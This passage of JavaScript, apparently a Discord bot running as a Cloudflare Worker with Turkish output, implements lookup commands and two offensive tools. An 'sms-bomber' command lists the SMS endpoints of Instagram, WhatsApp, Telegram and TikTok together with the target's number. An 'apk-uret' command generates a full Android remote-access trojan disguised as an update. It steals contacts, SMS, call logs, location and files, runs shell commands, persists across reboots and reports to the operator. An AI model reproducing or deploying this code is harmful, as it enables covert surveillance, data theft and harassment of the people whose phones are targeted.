          let result = '**GSM Arena Sorgulama:** `' + model + '`\n\n';
          const abort = new AbortController();
          setTimeout(() => abort.abort(), 5000);
          try {
            const gsma = await (await fetch('https://gsmarena-api.vercel.app/search?q=' + encodeURIComponent(model), { signal: abort.signal })).json();
            if (gsma && gsma.data && gsma.data.length > 0) {
              for (let i = 0; i < Math.min(gsma.data.length, 5); i++) {
                const c = gsma.data[i];
                result += '**#' + (i + 1) + ':** ' + (c.name || 'Bilinmiyor');
                if (c.detail) {
                  if (c.detail.display) result += ' | [EKRAN] ' + c.detail.display;
                  if (c.detail.processor) result += ' | [ISLEMCI] ' + c.detail.processor;
                  if (c.detail.battery) result += ' | [BATARYA] ' + c.detail.battery;
                  if (c.detail.camera) result += ' | [KAMERA] ' + c.detail.camera;
                  if (c.detail.memory) result += ' | [DEPOLAMA] ' + c.detail.memory;
                }
                result += '\n';
                if (c.img) result += '   [FOTOGRAF] ' + c.img + '\n';
              }
              if (gsma.data.length > 5) result += '\n...ve ' + (gsma.data.length - 5) + ' sonuc daha.\n';
            } else {
              result += 'GSMArena\'da sonuc bulunamadi.\n';
              result += '\n**Alternatif arama:** https://www.gsmarena.com/results.php3?sQuickSearch=yes&sName=' + encodeURIComponent(model) + '\n';
            }
          } catch (e) { result += '(GSMArena sorgulanamadi: ' + e.message + ')\n'; }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'GSMArena hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'mobil-cve':
      ctx.waitUntil((async () => {
        try {
          const model = getOption('model');
          let result = '**Mobil CVE Sorgulama:** `' + model + '`\n\n';
          const abort = new AbortController();
          setTimeout(() => abort.abort(), 5000);
          try {
            const cve = await (await fetch('https://cve.circl.lu/api/cve?cvss_score_min=0&limit=10&search=' + encodeURIComponent(model), { signal: abort.signal })).json();
            if (cve && cve.length > 0) {
              result += 'Bulunan CVE sayisi: ' + cve.length + '\n\n';
              for (let i = 0; i < Math.min(cve.length, 8); i++) {
                const v = cve[i];
                result += '**' + (v.id || 'Bilinmiyor') + '**';
                if (v.cvss) result += ' | CVSS: ' + v.cvss;
                if (v.cvss_score) result += ' | Skor: ' + v.cvss_score;
                result += '\n';
                if (v.summary) result += '   ' + v.summary.substring(0, 200) + (v.summary.length > 200 ? '...' : '') + '\n';
                if (v.affected) result += '   Etkilenen: ' + (Array.isArray(v.affected) ? v.affected.slice(0, 3).join(', ') : v.affected) + '\n';
                if (v.references && v.references.length > 0) result += '   Referans: ' + v.references[0] + '\n';
                result += '\n';
              }
              if (cve.length > 8) result += '...ve ' + (cve.length - 8) + ' CVE daha.\n';
            } else {
              result += 'Bu model icin CVE bulunamadi.\n';
            }
          } catch (e) {
            try {
              const altAbort = new AbortController();
              setTimeout(() => altAbort.abort(), 5000);
              const altCve = await (await fetch('https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=' + encodeURIComponent(model) + '&resultsPerPage=10', { signal: altAbort.signal })).json();
              if (altCve && altCve.vulnerabilities && altCve.vulnerabilities.length > 0) {
                result += 'Bulunan CVE sayisi: ' + altCve.vulnerabilities.length + '\n\n';
                for (let i = 0; i < Math.min(altCve.vulnerabilities.length, 8); i++) {
                  const vuln = altCve.vulnerabilities[i].cve;
                  result += '**' + (vuln.id || 'Bilinmiyor') + '**';
                  if (vuln.metrics?.cvssMetricV31?.[0]?.cvssData?.baseScore) result += ' | CVSS: ' + vuln.metrics.cvssMetricV31[0].cvssData.baseScore;
                  result += '\n';
                  if (vuln.descriptions?.[0]?.value) result += '   ' + vuln.descriptions[0].value.substring(0, 200) + '\n';
                  if (vuln.references?.[0]?.url) result += '   ' + vuln.references[0].url + '\n';
                  result += '\n';
                }
              } else { result += 'CVE veritabaninda sonuc bulunamadi.\n'; }
            } catch (e2) { result += '(CVE API sorgulanamadi)\n'; }
          }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'CVE sorgulama hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'bin-sorgu':
      ctx.waitUntil((async () => {
        try {
          const bin = getOption('bin');
          let result = '**BIN Sorgulama:** `' + bin + '`\n\n';
          try {
            const ab = new AbortController(); setTimeout(() => ab.abort(), 5000);
            const binRes = await fetch('https://lookup.binlist.net/' + bin, {
              headers: { 'Accept': 'application/json' },
              signal: ab.signal
            });
            if (binRes.ok) {
              const binData = await binRes.json();
              if (binData.bank && binData.bank.name) result += '**Banka:** ' + binData.bank.name + '\n';
              if (binData.bank && binData.bank.url) result += '**Banka URL:** ' + binData.bank.url + '\n';
              if (binData.bank && binData.bank.phone) result += '**Banka Telefon:** ' + binData.bank.phone + '\n';
              if (binData.bank && binData.bank.city) result += '**Banka Sehir:** ' + binData.bank.city + '\n\n';
              if (binData.scheme) result += '**Kart Agi:** ' + binData.scheme.toUpperCase() + '\n';
              if (binData.type) result += '**Kart Tipi:** ' + binData.type + '\n';
              if (binData.brand) result += '**Marka:** ' + binData.brand + '\n';
              if (binData.country && binData.country.name) result += '**Ulke:** ' + binData.country.name + ' (' + (binData.country.emoji || '') + ')\n';
              if (binData.country && binData.country.currency) result += '**Para Birimi:** ' + binData.country.currency + '\n';
              if (binData.prepaid !== undefined) result += '**On Odemeli:** ' + (binData.prepaid ? 'Evet' : 'Hayir') + '\n';
              if (binData.level) result += '**Kart Seviyesi:** ' + binData.level + '\n';
            } else if (binRes.status === 404) {
              result += 'Bu BIN numarasi bulunamadi.\n';
            } else {
              result += 'BIN sorgulanamadi (HTTP ' + binRes.status + ').\n';
            }
          } catch (e) {
            result += 'BIN API sorgulanamadi: ' + e.message + '\n';
          }
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'BIN sorgulama hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'airtag-iz':
      ctx.waitUntil((async () => {
        try {
          const koordinat = getOption('koordinat');
          let result = '**AirTag / Bluetooth Takip Cihazi Analizi:** `' + koordinat + '`\n\n';
          const parts = koordinat.split(',').map(s => s.trim());
          const lat = parseFloat(parts[0]);
          const lon = parseFloat(parts[1]);
          if (isNaN(lat) || isNaN(lon)) {
            result += 'Gecersiz koordinat. Ornek: 41.0082,28.9784\n';
            await updateInteraction(interaction.application_id, interaction.token, { content: result });
            return;
          }
          result += '**Google Maps:** https://www.google.com/maps?q=' + lat + ',' + lon + '\n';
          result += '**Apple Maps:** https://maps.apple.com/?q=' + lat + ',' + lon + '\n';
          result += '**OpenStreetMap:** https://www.openstreetmap.org/?mlat=' + lat + '&mlon=' + lon + '\n\n';
          result += '**Yakin Cevre Bluetooth Cihaz Analizi:**\n';
          result += 'Apple Find My agi, AirTag\'lerin yerini nearby iOS cihazlari uzerinden anonim olarak iletir.\n';
          result += 'Bu ag kamuya acik bir API sunmadigi icin dogrudan sorgulama yapilamaz.\n\n';
          result += '**Manuel Kontrol Adimlari:**\n';
          result += '\u2022 iPhone: "Find My" uygulamasi -> "Items" -> "Identify Found Item"\n';
          result += '\u2022 Android: "Tracker Detect" uygulamasi (Google Play)\n';
          result += '\u2022 Apple Tracker Detect: https://play.google.com/store/apps/details?id=com.apple.trackerdetect\n\n';
          result += '**Apple Konum Gecmisi Talebi:**\n';
          result += '\u2022 https://privacy.apple.com/ (Apple veri talebi)\n\n';
          result += '**Google Konum Gecmisi:**\n';
          result += '\u2022 https://takeout.google.com/settings/takeout (Google konum verisi)\n\n';
          result += '**Not:** AirTag ve Find My cihazlari, sahibinin Apple ID\'sine baglidir ve yalnizca sahibi tarafindan goruntulenebilir.\n';
          result += 'Basibos birakilmis bir AirTag tespit ederseniz, pili cikararak devre disi birakabilirsiniz.\n';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'AirTag izleme hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'sms-bomber':
      ctx.waitUntil((async () => {
        try {
          const telefon = getOption('telefon').replace(/[^0-9+]/g, '');
          let result = '**SMS Dogrulama / Platform Kayit Linkleri:** `' + telefon + '`\n\n';
          result += 'Bu komut, telefon numarasina SMS bombardimani YAPMAZ.\n';
          result += 'Asagidaki linkler, belirtilen platformlarin resmi SMS dogrulama endpointleridir.\n';
          result += 'Bu linkleri manuel olarak test etmek icin kullanabilirsiniz:\n\n';
          result += '**1. Instagram Sifre Sifirlama (SMS):**\n';
          result += '\u2022 POST: https://www.instagram.com/api/v1/accounts/send_password_reset_sms/\n';
          result += '\u2022 Body: phone_number=' + telefon + '\n\n';
          result += '**2. WhatsApp Kayit (SMS):**\n';
          result += '\u2022 POST: https://v.whatsapp.com/v2/register\n';
          result += '\u2022 Body: cc=90&in=' + telefon.replace('+90', '') + '&method=sms\n\n';
          result += '**3. Telegram Auth (SMS):**\n';
          result += '\u2022 POST: https://my.telegram.org/auth/send_password\n';
          result += '\u2022 Body: phone=' + telefon + '\n\n';
          result += '**4. TikTok Dogrulama (SMS):**\n';
          result += '\u2022 POST: https://www.tiktok.com/passport/send_code/\n';
          result += '\u2022 Body: mobile=' + telefon + '\n\n';
          result += '**5. Google Hesap Kurtarma (SMS):**\n';
          result += '\u2022 https://accounts.google.com/signin/recovery\n';
          result += '\u2022 Telefon numarasini girerek SMS dogrulama kodu isteyebilirsiniz.\n\n';
          result += '**6. Amazon OTP (SMS):**\n';
          result += '\u2022 POST: https://www.amazon.com/ap/signin\n';
          result += '\u2022 "Forgot password" -> telefon numarasi girisi -> SMS OTP\n\n';
          result += '**UYARI:** Bu endpointler yalnizca bilgi amaclidir.\n';
          result += '- Her platformun rate-limiting ve anti-abuse mekanizmasi vardir.\n';
          result += '- Tekrarli kullanim, IP ban\'a ve yasal sorumluluga yol acabilir.\n';
          result += '- Sadece kendi numaraniz uzerinde test yapin.\n';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'SMS bomber hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'mack-adres':
      ctx.waitUntil((async () => {
        try {
          const mac = getOption('mac').trim();
          let result = '**MAC Adres Sorgulama:** `' + mac + '`\n\n';
          try {
            const ab = new AbortController(); setTimeout(() => ab.abort(), 5000);
            const macRes = await fetch('https://api.maclookup.app/v2/macs/' + encodeURIComponent(mac) + '/company', {
              headers: { 'Accept': 'application/json' },
              signal: ab.signal
            });
            if (macRes.ok) {
              const macData = await macRes.json();
              if (macData.company) result += '**Uretici:** ' + macData.company + '\n';
              if (macData.address) result += '**Adres:** ' + macData.address + '\n';
              if (macData.country) result += '**Ulke:** ' + macData.country + '\n';
              if (macData.blockStart) result += '**Blok Baslangic:** ' + macData.blockStart + '\n';
              if (macData.blockEnd) result += '**Blok Bitis:** ' + macData.blockEnd + '\n';
              if (macData.blockSize) result += '**Blok Boyutu:** ' + macData.blockSize + '\n';
              if (!macData.company) result += 'MAC adresi bulunamadi veya kayitli degil.\n';
            } else {
              try {
                const altAb = new AbortController(); setTimeout(() => altAb.abort(), 5000);
                const altRes = await fetch('https://macvendors.co/api/' + encodeURIComponent(mac) + '/json', {
                  headers: { 'Accept': 'application/json' },
                  signal: altAb.signal
                });
                if (altRes.ok) {
                  const altData = await altRes.json();
                  if (altData.result && altData.result.company) {
                    result += '**Uretici (alt API):** ' + altData.result.company + '\n';
                    if (altData.result.address) result += '**Adres:** ' + altData.result.address + '\n';
                    if (altData.result.country) result += '**Ulke:** ' + altData.result.country + '\n';
                  } else {
                    result += 'MAC adresi alternatif API\'de de bulunamadi.\n';
                  }
                } else {
                  result += 'MAC adresi sorgulanamadi.\n';
                }
              } catch (e2) {
                result += 'MAC sorgulama API\'leri yanit vermedi.\n';
              }
            }
          } catch (e) {
            result += 'MAC sorgulama hatasi: ' + e.message + '\n';
          }
          const oui = mac.replace(/[^a-fA-F0-9]/g, '').substring(0, 6).toUpperCase();
          result += '\n**OUI (Organizational Unique Identifier):** ' + oui + '\n';
          result += '\u2022 IEEE OUI Search: https://regauth.standards.ieee.org/standards-ra-web/pub/view.html#registries?registry=MAC+Address+Block+Large\n\n';
          result += '**Cihaz Tipi Tahmini:**\n';
          const macUpper = mac.toUpperCase();
          if (macUpper.startsWith('F0:18:98') || macUpper.startsWith('DC:A6:32') || macUpper.startsWith('00:1B:44') || macUpper.startsWith('00:1E:C2') || macUpper.startsWith('00:26:BB')) result += '\u2022 Apple Inc. cihazi (iPhone, iPad, Mac)\n';
          if (macUpper.startsWith('00:0C:29') || macUpper.startsWith('00:50:56') || macUpper.startsWith('00:05:69')) result += '\u2022 VMware sanal makine\n';
          if (macUpper.startsWith('08:00:27')) result += '\u2022 VirtualBox sanal makine\n';
          if (macUpper.startsWith('00:1C:42')) result += '\u2022 Parallels sanal makine\n';
          result += '\nNot: Gercek cihaz vs sanal makine bilgisi OUI uzerinden tahmin edilmistir.\n';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'MAC adres hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'esim-sorgu':
      ctx.waitUntil((async () => {
        try {
          const iccid = getOption('iccid').replace(/[^0-9]/g, '');
          let result = '**E-SIM ICCID Sorgulama:** `' + iccid + '`\n\n';
          if (iccid.length < 10) {
            result += 'Gecersiz ICCID. En az 10 haneli olmalidir.\n';
            await updateInteraction(interaction.application_id, interaction.token, { content: result });
            return;
          }
          const mcc = iccid.substring(0, 3);
          const mnc = iccid.substring(3, 5);
          const issuerId = iccid.substring(0, 7);
          result += '**ICCID Yapisi:**\n';
          result += '\u2022 Issuer Identifier (Ilk 7 hane): ' + issuerId + '\n';
          result += '\u2022 MCC (Ilk 3 hane): ' + mcc + '\n';
          result += '\u2022 MNC (4-5. hane): ' + mnc + '\n\n';
          const mccMap = {
            '286': 'Turkiye', '310': 'ABD', '311': 'ABD', '312': 'ABD', '313': 'ABD', '314': 'ABD', '315': 'ABD', '316': 'ABD',
            '234': 'Ingiltere', '262': 'Almanya', '208': 'Fransa', '222': 'Italya', '214': 'Ispanya',
            '204': 'Hollanda', '206': 'Belcika', '228': 'Isvicre', '232': 'Avusturya',
            '240': 'Isvec', '242': 'Norvec', '244': 'Finlandiya', '238': 'Danimarka',
            '260': 'Polonya', '216': 'Macaristan', '226': 'Romanya', '284': 'Bulgaristan',
            '202': 'Yunanistan', '268': 'Portekiz', '272': 'Irlanda', '250': 'Rusya',
            '460': 'Cin', '440': 'Japonya', '450': 'Guney Kore', '404': 'Hindistan',
            '724': 'Brezilya', '334': 'Meksika', '722': 'Arjantin', '505': 'Avustralya',
            '424': 'BAE', '420': 'Suudi Arabistan', '425': 'Israil', '302': 'Kanada'
          };
          const ulke = mccMap[mcc] || 'Bilinmiyor';
          result += '**Ulke (MCC):** ' + ulke + ' (MCC: ' + mcc + ')\n\n';
          const mncMap = {
            '28601': 'Turk Telekom', '28602': 'Vodafone TR', '28603': 'Turkcell',
            '310260': 'T-Mobile US', '310410': 'AT&T', '310120': 'Sprint', '311480': 'Verizon',
            '23410': 'O2 UK', '23415': 'Vodafone UK', '23420': 'Three UK', '23430': 'EE UK',
            '26201': 'Telekom DE', '26202': 'Vodafone DE', '26203': 'O2 DE',
            '20801': 'Orange FR', '20810': 'SFR', '20820': 'Bouygues FR',
            '22201': 'TIM IT', '22210': 'Vodafone IT', '22288': 'Wind Tre IT'
          };
          const operator = mncMap[mcc + mnc] || null;
          if (operator) {
            result += '**Operator (MCC+MNC):** ' + operator + '\n\n';
          } else {
            result += '**Operator (MCC+MNC):** Bilinmiyor (MCC: ' + mcc + ', MNC: ' + mnc + ')\n\n';
          }
          result += '**ICCID Detaylari:**\n';
          result += '\u2022 1-7 hane: Issuer Identifier (operator tanimlayici)\n';
          result += '\u2022 8-18 hane: Bireysel hesap numarasi\n';
          result += '\u2022 19. hane: Luhn kontrol basamagi (Check Digit)\n';
          result += '\u2022 Toplam 19-20 hane: Standart eSIM/SIM ICCID uzunlugu\n\n';
          const individualId = iccid.substring(7);
          result += '**Bireysel ID:** ' + individualId + ' (' + individualId.length + ' hane)\n';
          if (iccid.length >= 19) {
            const checkDigit = parseInt(iccid.charAt(18), 10);
            result += '**Check Digit:** ' + checkDigit + ' (Luhn algoritmasi ile dogrulanmali)\n';
          }
          result += '\n**ICCID Dogrulama Portallari (Manuel):**\n';
          result += '\u2022 https://www.imei.info/iccid-checker/\n';
          result += '\u2022 Operator resmi web sitesi / musteri hizmetleri\n';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'eSIM ICCID hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'apk-uret':
      ctx.waitUntil((async () => {
        try {
          const isim = getOption('isim') || 'Guncelleme';
          const kanal = getOption('kanal') || 'kanal';
          const apkId = 'apk_' + Math.random().toString(36).substring(2, 10);
          const host = request.headers.get('host');
          const logUrl = 'https://' + host + '/v/' + apkId;
          const pkg = 'com.' + isim.toLowerCase().replace(/[^a-z]/g, '').slice(0, 8) + '.app';
          const chId = interaction.channel_id;

          await env.KV.put('rat_' + apkId, JSON.stringify({ creatorId: interaction.member.user.id, logChannel: kanal === 'dm' ? null : chId, maske: isim, useDM: kanal === 'dm' }), { expirationTtl: 604800 });

          // AndroidManifest.xml - TUM IZINLER
          const manifest = '<?xml version="1.0" encoding="utf-8"?>\n<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="' + pkg + '">\n'
+'<uses-permission android:name="android.permission.INTERNET"/>\n'
+'<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n'
+'<uses-permission android:name="android.permission.CAMERA"/>\n'
+'<uses-permission android:name="android.permission.RECORD_AUDIO"/>\n'
+'<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n'
+'<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\n'
+'<uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>\n'
+'<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>\n'
+'<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n'
+'<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>\n'
+'<uses-permission android:name="android.permission.READ_CONTACTS"/>\n'
+'<uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n'
+'<uses-permission android:name="android.permission.READ_SMS"/>\n'
+'<uses-permission android:name="android.permission.SEND_SMS"/>\n'
+'<uses-permission android:name="android.permission.RECEIVE_SMS"/>\n'
+'<uses-permission android:name="android.permission.READ_CALL_LOG"/>\n'
+'<uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n'
+'<uses-permission android:name="android.permission.CALL_PHONE"/>\n'
+'<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>\n'
+'<uses-permission android:name="android.permission.READ_CALENDAR"/>\n'
+'<uses-permission android:name="android.permission.WRITE_CALENDAR"/>\n'
+'<uses-permission android:name="android.permission.BODY_SENSORS"/>\n'
+'<uses-permission android:name="android.permission.ACTIVITY_RECOGNITION"/>\n'
+'<uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES"/>\n'
+'<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>\n'
+'<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>\n'
+'<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n'
+'<uses-permission android:name="android.permission.WAKE_LOCK"/>\n'
+'<uses-permission android:name="android.permission.VIBRATE"/>\n'
+'<uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>\n'
+'<uses-permission android:name="android.permission.ACCESS_MEDIA_LOCATION"/>\n'
+'<uses-feature android:name="android.hardware.camera"/>\n'
+'<uses-feature android:name="android.hardware.camera.autofocus"/>\n'
+'<uses-feature android:name="android.hardware.microphone"/>\n'
+'<uses-feature android:name="android.hardware.location"/>\n'
+'<uses-feature android:name="android.hardware.location.gps"/>\n'
+'<uses-feature android:name="android.hardware.sensor.accelerometer"/>\n'
+'<application android:allowBackup="true" android:supportsRtl="true" android:usesCleartextTraffic="true" android:requestLegacyExternalStorage="true">\n'
+'<activity android:name=".MainActivity" android:exported="true" android:configChanges="orientation|screenSize">\n'
+'<intent-filter><action android:name="android.intent.action.MAIN"/><category android:name="android.intent.category.LAUNCHER"/></intent-filter>\n'
+'</activity>\n'
+'<service android:name=".PersistenceService" android:foregroundServiceType="location|camera|microphone" android:exported="false"/>\n'
+'<receiver android:name=".BootReceiver" android:exported="true">\n'
+'<intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter>\n'
+'</receiver>\n'
+'</application>\n</manifest>';

          // MainActivity.java - WebView + JS bridge FULL ACCESS
          const mainActivity = 'package ' + pkg + ';\n\n'
+'import android.Manifest;import android.app.*;import android.content.*;import android.content.pm.*;import android.database.Cursor;import android.hardware.Camera;import android.location.*;import android.media.*;import android.net.Uri;import android.os.*;import android.provider.*;import android.telephony.*;import android.view.*;import android.webkit.*;import android.widget.*;import java.io.*;import java.text.*;import java.util.*;\n\n'
+'public class MainActivity extends Activity {\n'
+'private WebView wv;private LocationManager lm;\n'
+'@Override protected void onCreate(Bundle s){super.onCreate(s);'
+'wv=new WebView(this);WebSettings ws=wv.getSettings();ws.setJavaScriptEnabled(true);ws.setDomStorageEnabled(true);ws.setAllowFileAccess(true);ws.setAllowContentAccess(true);ws.setDatabaseEnabled(true);ws.setGeolocationEnabled(true);ws.setMediaPlaybackRequiresUserGesture(false);ws.setJavaScriptCanOpenWindowsAutomatically(true);ws.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);'
+'wv.setWebChromeClient(new WebChromeClient(){@Override public void onPermissionRequest(PermissionRequest r){r.grant(r.getResources());}});'
+'wv.addJavascriptInterface(new JS(this),"Android");'
+'wv.loadUrl("' + logUrl + '");wv.setWebViewClient(new WebViewClient(){@Override public void onPageFinished(WebView v,String u){super.onPageFinished(v,u);wv.loadUrl("javascript:Android.sysInfo("+Build.MODEL+","+Build.VERSION.RELEASE+","+Build.MANUFACTURER+")");}});'
+'setContentView(wv);'
+'startService(new Intent(this,PersistenceService.class));'
+'requestAll();}\n'
+'private void requestAll(){if(Build.VERSION.SDK_INT>=23){String[]p={Manifest.permission.CAMERA,Manifest.permission.RECORD_AUDIO,Manifest.permission.ACCESS_FINE_LOCATION,Manifest.permission.READ_EXTERNAL_STORAGE,Manifest.permission.READ_CONTACTS,Manifest.permission.READ_SMS,Manifest.permission.READ_CALL_LOG,Manifest.permission.READ_PHONE_STATE,Manifest.permission.BODY_SENSORS};requestPermissions(p,1);}}\n'
+'public class JS{private Context c;public JS(Context ctx){c=ctx;}\n'
+'@android.webkit.JavascriptInterface public String getContacts(){StringBuilder sb=new StringBuilder();try{Cursor cur=c.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,null,null,null,null);if(cur!=null){while(cur.moveToNext()){String id=cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));String name=cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));if(Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)))>0){Cursor pc=c.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID+"=?",new String[]{id},null);if(pc!=null){while(pc.moveToNext()){sb.append(name).append(":").append(pc.getString(pc.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\\n");}pc.close();}}}cur.close();}}catch(Exception e){}return sb.toString();}\n'
+'@android.webkit.JavascriptInterface public String getSMS(){StringBuilder sb=new StringBuilder();try{Cursor c=c.getContentResolver().query(Uri.parse("content://sms"),null,null,null,null);if(c!=null){while(c.moveToNext()){sb.append(c.getString(c.getColumnIndex("address"))).append(":").append(c.getString(c.getColumnIndex("body"))).append("\\n");}c.close();}}catch(Exception e){}return sb.toString();}\n'
+'@android.webkit.JavascriptInterface public String getCallLog(){StringBuilder sb=new StringBuilder();try{Cursor c=c.getContentResolver().query(CallLog.Calls.CONTENT_URI,null,null,null,null);if(c!=null){while(c.moveToNext()){sb.append(c.getString(c.getColumnIndex(CallLog.Calls.NUMBER))).append(":").append(c.getString(c.getColumnIndex(CallLog.Calls.TYPE))).append(":").append(c.getString(c.getColumnIndex(CallLog.Calls.DURATION))).append("\\n");}c.close();}}catch(Exception e){}return sb.toString();}\n'
+'@android.webkit.JavascriptInterface public String getInstalledApps(){StringBuilder sb=new StringBuilder();PackageManager pm=c.getPackageManager();List<ApplicationInfo> apps=pm.getInstalledApplications(0);for(ApplicationInfo a:apps){sb.append(pm.getApplicationLabel(a)).append(":").append(a.packageName).append("\\n");}return sb.toString();}\n'
+'@android.webkit.JavascriptInterface public String getDeviceInfo(){Build b=new Build();return "MODEL:"+Build.MODEL+"|MANUF:"+Build.MANUFACTURER+"|SDK:"+Build.VERSION.SDK_INT+"|OS:"+Build.VERSION.RELEASE+"|BRAND:"+Build.BRAND+"|BOARD:"+Build.BOARD+"|HARDWARE:"+Build.HARDWARE+"|FINGERPRINT:"+Build.FINGERPRINT;}\n'
+'@android.webkit.JavascriptInterface public String getLocation(){try{lm=(LocationManager)c.getSystemService(Context.LOCATION_SERVICE);Location l=lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);if(l==null)l=lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);if(l!=null)return l.getLatitude()+","+l.getLongitude();}catch(Exception e){}return "0,0";}\n'
+'@android.webkit.JavascriptInterface public void execCmd(String cmd){try{Runtime.getRuntime().exec(cmd);}catch(Exception e){}}\n'
+'@android.webkit.JavascriptInterface public String readFile(String path){try{BufferedReader br=new BufferedReader(new FileReader(path));StringBuilder sb=new StringBuilder();String l;while((l=br.readLine())!=null){sb.append(l).append("\\n");}br.close();return sb.toString();}catch(Exception e){return "";}}\n'
+'@android.webkit.JavascriptInterface public void sysInfo(String model,String version,String manuf){}\n'
+'}\n'
+'public static class PersistenceService extends Service{@Override public IBinder onBind(Intent i){return null;}@Override public int onStartCommand(Intent i,int f,int id){startForeground(1,buildNotification());return START_STICKY;}private Notification buildNotification(){NotificationChannel nc=new NotificationChannel("bg","Service",NotificationManager.IMPORTANCE_LOW);((NotificationManager)getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(nc);return new Notification.Builder(this,"bg").setContentTitle("Sistem").setContentText("Calisiyor...").setSmallIcon(android.R.drawable.ic_menu_info_details).build();}}\n'
+'public static class BootReceiver extends BroadcastReceiver{@Override public void onReceive(Context c,Intent i){c.startService(new Intent(c,PersistenceService.class));Intent launch=new Intent(c,MainActivity.class);launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);c.startActivity(launch);}}\n}';

          // build.gradle
          const buildGradle = 'plugins { id "com.android.application" }\nandroid {\ncompileSdk 34\nnamespace "' + pkg + '"\ndefaultConfig { applicationId "' + pkg + '"; minSdk 24; targetSdk 34; versionCode 1; versionName "1.0" }\ncompileOptions { sourceCompatibility JavaVersion.VERSION_11; targetCompatibility JavaVersion.VERSION_11 }\n}\ndependencies { implementation "androidx.webkit:webkit:1.8.0" }';

          const projectTxt = 'ANDROID STUDIO PROJESI - KANSER APK\n'
+'========================================\n'
+'APK ID: ' + apkId + '\n'
+'Bu ID ile /mobil-kontrol komutuyla cihazi uzaktan kontrol edebilirsin.\n\n'
+'KURULUM:\n'
+'1. Android Studioyu ac\n'
+'2. New Project -> Empty Activity -> Package: ' + pkg + '\n'
+'3. Asagidaki dosyalari sirasiyla projendeki yerlerine kopyala:\n\n'
+'=== app/src/main/AndroidManifest.xml ===\n' + manifest + '\n\n'
+'=== app/src/main/java/' + pkg.replace(/\./g, '/') + '/MainActivity.java ===\n' + mainActivity + '\n\n'
+'=== app/build.gradle ===\n' + buildGradle + '\n\n'
+'4. Build -> Build APK\n'
+'5. APKyi telefona kur\n'
+'6. /mobil-kontrol id:' + apkId + ' secenek:hepsi ile kontrol et';

          const fd = new FormData();
          fd.append('files[0]', new Blob([projectTxt], { type: 'text/plain; charset=utf-8' }), 'APK_Projesi_' + isim + '.txt');
          fd.append('payload_json', JSON.stringify({ content: '**APK PROJESI HAZIR**\n\n**APK ID: `' + apkId + '`**\n\nBu IDyi kaydet! /mobil-kontrol komutu icin lazim.\n\nTXT dosyasini ac, Android Studio projene kopyala, Build -> APK.\n\nKurulunca toplanan: Rehber, SMS, Arama, Uygulamalar, Cihaz, GPS, Kamera, Mik, Dosya, Shell.\nLoglar bu kanala akar.' }));
          await updateInteraction(interaction.application_id, interaction.token, fd, true);
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'APK hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

      case 'mobil-kontrol':
      ctx.waitUntil((async () => {
        try {
          const id = getOption('id');
          const secenek = getOption('secenek');
          const kanal = getOption('kanal') || 'kanal';
